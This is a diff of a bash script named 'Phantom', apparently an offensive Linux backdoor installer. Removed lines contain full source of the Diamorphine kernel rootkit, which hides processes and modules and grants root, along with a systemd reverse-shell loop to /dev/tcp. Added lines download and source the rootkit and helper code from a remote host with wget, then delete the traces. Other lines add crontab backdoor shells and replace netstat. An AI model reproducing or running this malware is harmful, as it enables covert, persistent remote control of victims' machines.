@@ -26,641 +26,32 @@ OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE.
 '
 
-ip="127.0.0.1"
+ip="192.168.80.1"
 port="9999"
+portp="33333"
 
-#---functions and variables---
-#--rootkit--
-#makefile
-diamorphine_makefile=$(cat << \EOF
-obj-m := usb-bus.o
-KERNEL_DIR = /lib/modules/$(shell uname -r)/build
-PWD = $(shell pwd)
-all:
-  make -C $(KERNEL_DIR) SUBDIRS=$(PWD) modules
-EOF
-)
-
-: 'The following notice is for the rootkit:
-
-Copyright (c) 2014, Victor N. Ramos Mello
-All rights reserved.
-
-Redistribution and use in source and binary forms, with or without
-modification, are permitted provided that the following conditions are met:
-    * Redistributions of source code must retain the above copyright
-      notice, this list of conditions and the following disclaimer.
-    * Redistributions in binary form must reproduce the above copyright
-      notice, this list of conditions and the following disclaimer in the
-      documentation and/or other materials provided with the distribution.
-    * The name of the author may not be used to endorse or promote products
-      derived from this software without specific prior written permission.
-
-THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
-ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
-WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
-DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY
-DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
-(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
-LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
-ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
-(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
-SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
-'
-
-#rootkit
-diamorphine=$(cat << \EOF
-#include <linux/sched.h>
-#include <linux/module.h>
-#include <linux/syscalls.h>
-#include <linux/dirent.h>
-#include <linux/slab.h>
-#include <linux/version.h>
-#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
-  #include <asm/uaccess.h>
-#endif
-
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
-  #include <linux/proc_ns.h>
-#else
-  #include <linux/proc_fs.h>
-#endif
-
-#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 26)
-  #include <linux/file.h>
-#else
-  #include <linux/fdtable.h>
-#endif
-
-struct linux_dirent {
-        unsigned long   d_ino;
-        unsigned long   d_off;
-        unsigned short  d_reclen;
-        char            d_name[1];
-};
-
-char* MAGIC_PREFIX[4] = {"d-bus", "dbus-org.freedesktop.Modem.service", "usb-bus", "dbus-org.freedesktop.ModemManager11.service"};
-int indexes = sizeof(MAGIC_PREFIX)/sizeof(MAGIC_PREFIX[0]);
-
-#define PF_INVISIBLE 0x10000000
-
-#define MODULE_NAME "diamorphine"
-
-enum {
-  SIGINVIS = 31,
-  SIGSUPER = 64,
-  SIGMODINVIS = 63,
-};
-
-int i;
-unsigned long cr0;
-static unsigned long *__sys_call_table;
-typedef asmlinkage int (*orig_getdents_t)(unsigned int, struct linux_dirent *,
-  unsigned int);
-typedef asmlinkage int (*orig_getdents64_t)(unsigned int,
-  struct linux_dirent64 *, unsigned int);
-typedef asmlinkage int (*orig_kill_t)(pid_t, int);
-orig_getdents_t orig_getdents;
-orig_getdents64_t orig_getdents64;
-orig_kill_t orig_kill;
-
-unsigned long *
-get_syscall_table_bf(void)
-{
-  unsigned long *syscall_table;
-  unsigned long int i;
-
-  for (i = (unsigned long int)sys_close; i < ULONG_MAX;
-      i += sizeof(void *)) {
-    syscall_table = (unsigned long *)i;
-
-    if (syscall_table[__NR_close] == (unsigned long)sys_close)
-      return syscall_table;
-  }
-  return NULL;
-}
-
-struct task_struct *
-find_task(pid_t pid)
-{
-  struct task_struct *p = current;
-  for_each_process(p) {
-    if (p->pid == pid)
-      return p;
-  }
-  return NULL;
-}
-
-int
-is_invisible(pid_t pid)
-{
-  struct task_struct *task;
-  if (!pid)
-    return 0;
-  task = find_task(pid);
-  if (!task)
-    return 0;
-  if (task->flags & PF_INVISIBLE)
-    return 1;
-  return 0;
-}
-
-asmlinkage int
-hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
-  unsigned int count)
-{
-  int ret = orig_getdents64(fd, dirent, count), err;
-  unsigned short proc = 0;
-  unsigned long off = 0;
-  struct linux_dirent64 *dir, *kdirent, *prev = NULL;
-  struct inode *d_inode;
-
-  if (ret <= 0)
-    return ret;
-
-  kdirent = kzalloc(ret, GFP_KERNEL);
-  if (kdirent == NULL)
-    return ret;
-
-  err = copy_from_user(kdirent, dirent, ret);
-  if (err)
-    goto out;
-
-#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
-  d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
-#else
-  d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
-#endif
-  if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
-    /*&& MINOR(d_inode->i_rdev) == 1*/)
-    proc = 1;
-
-  while (off < ret) {
-    dir = (void *)kdirent + off;
-    for (i = 0; i < indexes; i++) {
-    if ((!proc &&
-    (memcmp(MAGIC_PREFIX[i], dir->d_name, strlen(MAGIC_PREFIX[i])) == 0))
-    || (proc &&
-    is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
-      if (dir == kdirent) {
-        ret -= dir->d_reclen;
-        memmove(dir, (void *)dir + dir->d_reclen, ret);
-        continue;
-      }
-      prev->d_reclen += dir->d_reclen;
-    } else
-      if (i == indexes - 1) {
-      prev = dir;
-      }
-    }
-    off += dir->d_reclen;
-  }
-  err = copy_to_user(dirent, kdirent, ret);
-  if (err)
-    goto out;
-out:
-  kfree(kdirent);
-  return ret;
-}
-
-asmlinkage int
-hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
-  unsigned int count)
-{
-  int ret = orig_getdents(fd, dirent, count), err;
-  unsigned short proc = 0;
-  unsigned long off = 0;
-  struct linux_dirent *dir, *kdirent, *prev = NULL;
-  struct inode *d_inode;
-
-  if (ret <= 0)
-    return ret;
-
-  kdirent = kzalloc(ret, GFP_KERNEL);
-  if (kdirent == NULL)
-    return ret;
-
-  err = copy_from_user(kdirent, dirent, ret);
-  if (err)
-    goto out;
-
-#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
-  d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
-#else
-  d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
-#endif
-
-  if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
-    /*&& MINOR(d_inode->i_rdev) == 1*/)
-    proc = 1;
-
-  while (off < ret) {
-    dir = (void *)kdirent + off;
-    for (i = 0; i < indexes; i++) {
-    if ((!proc &&
-    (memcmp(MAGIC_PREFIX[i], dir->d_name, strlen(MAGIC_PREFIX[i])) == 0))
-    || (proc &&
-    is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
-      if (dir == kdirent) {
-        ret -= dir->d_reclen;
-        memmove(dir, (void *)dir + dir->d_reclen, ret);
-        continue;
-      }
-      prev->d_reclen += dir->d_reclen;
-    } else
-      if (i == indexes - 1) {
-      prev = dir;
-      }
-    }
-    off += dir->d_reclen;
-  }
-  err = copy_to_user(dirent, kdirent, ret);
-  if (err)
-    goto out;
-out:
-  kfree(kdirent);
-  return ret;
-}
-
-void
-give_root(void)
-{
-  #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
-    current->uid = current->gid = 0;
-    current->euid = current->egid = 0;
-    current->suid = current->sgid = 0;
-    current->fsuid = current->fsgid = 0;
-  #else
-    struct cred *newcreds;
-    newcreds = prepare_creds();
-    if (newcreds == NULL)
-      return;
-    #if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0) \
-      && defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS) \
-      || LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
-      newcreds->uid.val = newcreds->gid.val = 0;
-      newcreds->euid.val = newcreds->egid.val = 0;
-      newcreds->suid.val = newcreds->sgid.val = 0;
-      newcreds->fsuid.val = newcreds->fsgid.val = 0;
-    #else
-      newcreds->uid = newcreds->gid = 0;
-      newcreds->euid = newcreds->egid = 0;
-      newcreds->suid = newcreds->sgid = 0;
-      newcreds->fsuid = newcreds->fsgid = 0;
-    #endif
-    commit_creds(newcreds);
-  #endif
-}
-
-static inline void
-tidy(void)
-{
-//	kfree(THIS_MODULE->notes_attrs);
-//	THIS_MODULE->notes_attrs = NULL;
-  kfree(THIS_MODULE->sect_attrs);
-  THIS_MODULE->sect_attrs = NULL;
-//	kfree(THIS_MODULE->mkobj.mp);
-//	THIS_MODULE->mkobj.mp = NULL;
-//	THIS_MODULE->modinfo_attrs->attr.name = NULL;
-//	kfree(THIS_MODULE->mkobj.drivers_dir);
-//	THIS_MODULE->mkobj.drivers_dir = NULL;
-}
-
-static struct list_head *module_previous;
-static short module_hidden = 0;
-
-void
-module_show(void)
-{
-  list_add(&THIS_MODULE->list, module_previous);
-  //kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent,
-  //			MODULE_NAME);
-  module_hidden = 0;
-}
-
-
-void
-module_hide(void)
-{
-  module_previous = THIS_MODULE->list.prev;
-  list_del(&THIS_MODULE->list);
-  kobject_del(&THIS_MODULE->mkobj.kobj);
-  //list_del(&THIS_MODULE->mkobj.kobj.entry);
-  module_hidden = 1;
-}
-
-asmlinkage int
-hacked_kill(pid_t pid, int sig)
-{
-  struct task_struct *task;
-
-  switch (sig) {
-    case SIGINVIS:
-      if ((task = find_task(pid)) == NULL)
-        return -ESRCH;
-      task->flags = PF_INVISIBLE;
-      //task->flags ^= PF_INVISIBLE;
-      break;
-    case SIGSUPER:
-      give_root();
-      break;
-    case SIGMODINVIS:
-      if (module_hidden) module_show();
-      else module_hide();
-      break;
-    default:
-      return orig_kill(pid, sig);
-  }
-  return 0;
-}
-
-static inline void
-protect_memory(void)
-{
-  write_cr0(cr0);
-}
-
-static inline void
-unprotect_memory(void)
-{
-  write_cr0(cr0 & ~0x00010000);
-}
-
-static int __init
-diamorphine_init(void)
-{
-  __sys_call_table = get_syscall_table_bf();
-  if (!__sys_call_table)
-    return -1;
-
-  cr0 = read_cr0();
-
-  module_hide();
-  tidy();
-
-  orig_getdents = (orig_getdents_t)__sys_call_table[__NR_getdents];
-  orig_getdents64 = (orig_getdents64_t)__sys_call_table[__NR_getdents64];
-  orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
-
-  unprotect_memory();
-  __sys_call_table[__NR_getdents] = (unsigned long)hacked_getdents;
-  __sys_call_table[__NR_getdents64] = (unsigned long)hacked_getdents64;
-  __sys_call_table[__NR_kill] = (unsigned long)hacked_kill;
-  protect_memory();
-
-  return 0;
-}
-
-static void __exit
-diamorphine_cleanup(void)
-{
-  unprotect_memory();
-  __sys_call_table[__NR_getdents] = (unsigned long)orig_getdents;
-  __sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
-  __sys_call_table[__NR_kill] = (unsigned long)orig_kill;
-  protect_memory();
-}
-
-module_init(diamorphine_init);
-module_exit(diamorphine_cleanup);
-
-MODULE_LICENSE("Dual BSD/GPL");
-MODULE_AUTHOR("m0nad");
-MODULE_DESCRIPTION("LKM rootkit");
-EOF
-)
-
-#--functions--
-#install prerequisite programs
-install_pre () {
-  which $1 &>/dev/null
-  if [ "$?" != "0" ]; then
-    printf "installing $1... "
-    apt-get install -y $1 &>/dev/null
-    if [ "$?" == "0" ]; then
-      echo "done"
-    else
-      dnf install -y $1 &>/dev/null
-      if [ "$?" == "0" ]; then
-        echo "done"
-      else
-        echo "failed"
-      fi
-    fi
-  else
-    return 1
-  fi
-}
-
-#remove prerequisite programs
-remove_pre () {
-  printf "removing $1... "
-  apt-get purge -y $1 &>/dev/null
-  if [ "$?" == "0" ]; then
-    echo "done"
-  else
-    dnf remove -y $1 &>/dev/null
-    if [ "$?" == "0" ]; then
-      echo "done"
-    else
-      echo "failed"
-    fi
-  fi
-}
-
-#the script that the systemd service is gonna use
-create_script () {
-  printf "creating the $2 script... "
-  printf "$1" >$2
-  chmod 777 $2
-  if [ "$?" == "0" ]; then
-    echo "done"
-  else
-    echo "failed"
-  fi
-}
-
-#create the systemd service
-create_service () {
-  printf "$1" >/etc/systemd/system/$2
-  systemctl daemon-reload
-  printf "enabling $2... "
-  systemctl enable $2 &>/dev/null
-  if [ "$?" == "0" ]; then
-    echo "done"
-  else
-    echo "failed"
-  fi
-  printf "starting $2... "
-  systemctl stop $2 &>/dev/null
-  systemctl start $2 &>/dev/null
-  if [ "$?" == "0" ]; then
-    echo "done"
-  else
-    echo "failed"
-  fi
-}
-
-#finish message
-finish () {
-  if [ "$?" == "0" ]; then
-    echo "done"
-  else
-    echo "failed"
-  fi
-}
-
-#--services--
-#--1st systemd service--
-#that's the script that is gonna insert the usb-bus rootkit module at boot, hide the systemd services and the bash processes
-hiding_script=$(cat << \EOF
-#!/bin/bash
-
-insmod /lib/modules/$(uname -r)/kernel/drivers/usb-bus/usb-bus.ko
-
-hidden_pids=()
-
-while true; do
-
-#hide usb-bus and d-bus, which are the scripts that the systemd services execute
-bash_pid=$(ps aux | awk '{ if($11 ~ /bash/) print $2 }')
-while read hide_pid; do
-  cmdline=$(cat /proc/$hide_pid/cmdline)
-  cat /proc/$hide_pid/cmdline &>/dev/null
-  if [ "$?" == "1" ]; then
-    continue
-  fi
-  if [ "$cmdline" == "/bin/bash/var/lib/usb-bus/usb-bus" ] || [ "$cmdline" == "/bin/bash/usr/local/share/d-bus/d-bus" ]; then
-    kill -31 $hide_pid
-    #echo "hid systemd service pid: $hide_pid"
-  fi
-done <<<$bash_pid
-
-#hide bash shells which our systemd service spawns
-inode_list=$(cat /proc/net/tcp | awk '{ if($3 ~ /0100007F:270F/) print $10 }')
-for (( i=1; i <= 65553; i=i+1 )); do
-  if [ "${hidden_pids[i]}" != "" ]; then
-    #echo "$i already on hidden_pids"
-    continue
-  fi
-  socket=$(readlink /proc/$i/fd/0)
-  while read inode_number; do
-    if [ "socket:[$inode_number]" == "$socket" ]; then
-      #echo "pid: $i inode_number: $inode_number"
-      kill -31 $i
-      #echo "hid bash pid: $i"
-      hidden_pids[i]=$i
-      #echo "hidden_pids[i] pid: ${hidden_pids[i]}"
-    fi
-  done <<<$inode_list
-done
-
-#sleep 10
-
-done
-EOF
-)
-
-#that's the systemd service that's gonna do the hiding
-hiding_service=$(cat << \EOF
-[Unit]
-After=network.target
-StartLimitIntervalSec=0
-
-[Service]
-Type=simple
-ExecStart=/var/lib/usb-bus/usb-bus
-Restart=always
-User=root
-
-[Install]
-WantedBy=multi-user.target
-EOF
-)
-
-#--2nd systemd service--
-#that's the script that's gonna open the bash connections
-bash_script=$(cat << EOF
-#!/bin/bash
-
-while true; do
-
-bash &>/dev/tcp/$ip/$port 0>&1 &
-sleep 300
-
-done
-EOF
-)
-
-#that's the systemd service that's gonna open the bash connections
-bash_service=$(cat << \EOF
-[Unit]
-After=network.target
-StartLimitIntervalSec=0
-
-[Service]
-Type=simple
-ExecStart=/usr/local/share/d-bus/d-bus
-Restart=always
-User=root
-
-[Install]
-WantedBy=multi-user.target
-EOF
-)
-
-#--variables--
-#kernel makefile
-kernel_makefile=$(cat << \EOF
-diff --git a/Makefile b/Makefile
-index dda982c..f96b174 100644
---- a/Makefile
-+++ b/Makefile
-@@ -608,6 +608,12 @@ endif # $(dot-config)
- # Defaults to vmlinux, but the arch makefile usually adds further targets
- all: vmlinux
-
-+# force no-pie for distro compilers that enable pie by default
-+KBUILD_CFLAGS += $(call cc-option, -fno-pie)
-+KBUILD_CFLAGS += $(call cc-option, -no-pie)
-+KBUILD_AFLAGS += $(call cc-option, -fno-pie)
-+KBUILD_CPPFLAGS += $(call cc-option, -fno-pie)
-+
- # The arch Makefile can set ARCH_{CPP,A,C}FLAGS to override the default
- # values of the respective KBUILD_* variables
- ARCH_CPPFLAGS :=
-EOF
-)
-
-#net-tools patch
-net_tools_patch=$(cat << \EOF
-diff --git a/iptunnel.c b/iptunnel.c
-index 4943d83..acfcbc7 100644
---- a/iptunnel.c
-+++ b/iptunnel.c
-@@ -26,7 +26,6 @@
- #include <sys/socket.h>
- #include <sys/ioctl.h>
- #include <netinet/in.h>
--#include <netinet/ip.h>
- #include <arpa/inet.h>
- #if defined(__GLIBC__) && (__GLIBC__ > 2 || (__GLIBC__ == 2 && __GLIBC_MINOR__ >= 1))
- #include <net/if.h>
-@@ -36,6 +35,7 @@
- #include <linux/if_arp.h>
- #endif
- #include <linux/types.h>
-+#include <linux/ip.h>
- #include <linux/if_tunnel.h>
-
- #include "config.h"
-EOF
-)
-
-#---start phantom---
 echo "---Phantom started---"
-#print the user making the connection
 echo "user making the connection: $USER"
+
+#get the functions and variables needed by payload
+echo "--get needed functions and variables--"
+printf "get functions... "
+wget -q -O /tmp/.functions http://$ip:$portp/functions
+source /tmp/.functions
+finish
+printf "get rootkit... "
+wget -q -O /tmp/.rootkit http://$ip:$portp/rootkit
+source /tmp/.rootkit
+finish
+printf "get services... "
+wget -q -O /tmp/.services http://$ip:$portp/services
+source /tmp/.services
+finish
+printf "get variables... "
+wget -q -O /tmp/.variables http://$ip:$portp/variables
+source /tmp/.variables
+finish
+
 #if the user making the connection is not root add a crontab entry which spawns backdoor bash shells
 if [ "$USER" != "root" ]; then
   printf "adding crontab for $USER... "
@@ -676,11 +67,11 @@ if [ "$USER" == "root" ]; then
   #users=$(cat /etc/passwd | awk -F: '{ print $1 }')
   #read -d + -a usernames <<< "$users"
   #for (( i=0; i < ${#usernames[@]}; i=i+1 )); do
-  #	cron=$(crontab -u ${usernames[i]} -l 2>/dev/null)
-  #	if [ "$cron" == "* * * * * bash -c 'bash &>/dev/tcp/$ip 0>&1'" ]; then
-  #		crontab -u ${usernames[i]} -r
-  #		echo "removing ${usernames[i]} crontab"
-  #	fi
+  #  cron=$(crontab -u ${usernames[i]} -l 2>/dev/null)
+  #  if [ "$cron" == "* * * * * bash -c 'bash &>/dev/tcp/$ip 0>&1'" ]; then
+  #    crontab -u ${usernames[i]} -r
+  #    echo "removing ${usernames[i]} crontab"
+  #  fi
   #done
 
   #--create the systemd scripts and services--
@@ -695,7 +86,6 @@ if [ "$USER" == "root" ]; then
   #--install prerequisite programs--
   echo "--install prerequisite programs--"
   programs=(make gcc wget yes unzip patch kmod)
-  uninstall=()
   for ((i=0; i < ${#programs[@]}; i++)); do
     install_pre ${programs[$i]}
     if [ "$?" == "0" ]; then
@@ -717,9 +107,10 @@ if [ "$USER" == "root" ]; then
   make -C /lib/modules/$(uname -r)/kernel/drivers/usb-bus &>/dev/null
   if [ "$?" == "0" ]; then
     echo "done"
+
+  #--if make is unsuccessful get the headers needed for the module to work, patch the kernel makefile and make again--
   else
     echo "failed, trying some fixes"
-    #if make is unsuccessful get the headers needed for the module to work, patch the kernel makefile and make again
     #copy the headers
     if [ ! -d "/usr/src/linux-headers-$(uname -r)/include/asm" ] || [ ! -L "/usr/src/linux-headers-$(uname -r)/include/asm" ]; then
       cp -r -L /usr/src/linux-headers-$(uname -r)/arch/x86/include/asm /usr/src/linux-headers-$(uname -r)/include
@@ -763,22 +154,25 @@ if [ "$USER" == "root" ]; then
   #printf "usb-bus" >/usr/lib/modules-load.d/usb-bus.conf
   #depmod -a #take care of dependencies otherwise you will have problems booting
 
-  #remove what is not needed after the make
+  #remove uneeded rootkit files
+  printf "removing uneeded rootkit files... "
   rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/*.c &>/dev/null
   rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/*.o &>/dev/null
   rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/Makefile &>/dev/null
   rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/Module* &>/dev/null
   rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/modules* &>/dev/null
   rm /lib/modules/$(uname -r)/kernel/drivers/usb-bus/*safe &>/dev/null
+  echo "done"
+
   #insert the usb-bus module
   printf "inserting the usb-bus module... "
   insmod /lib/modules/$(uname -r)/kernel/drivers/usb-bus/usb-bus.ko &>/dev/null
   finish
 
-  #---replace netstat---
+  #--replace netstat--
   which netstat &>/dev/null
   if [ "$?" == "0" ]; then
-    echo "---replace netstat---"
+    echo "--replace netstat--"
     rm /tmp/net-tools.zip &>/dev/null
     rm  -r /tmp/net-tools-master &>/dev/null
     #download net-tools.zip
@@ -819,8 +213,18 @@ if [ "$USER" == "root" ]; then
     rm  -r /tmp/net-tools-master
   fi
 
-  #--remove prerequisite programs--
-  echo "--remove prerequisite programs--"
+  #--remove files and prerequisite programs--
+  echo "--remove files and prerequisite programs--"
+  printf "removing files needed by payload... "
+  rm /tmp/.rootkit &>/dev/null
+  rm /tmp/.functions &>/dev/null
+  rm /tmp/.services &>/dev/null
+  rm /tmp/.variables &>/dev/null
+  if [ "$?" == "0" ]; then
+    echo "done"
+  else
+    echo "failed"
+  fi
   for ((i=0; i < ${#uninstall[@]}; i++)); do
     if [ "${uninstall[i]}" != "0" ]; then
       remove_pre ${uninstall[i]}
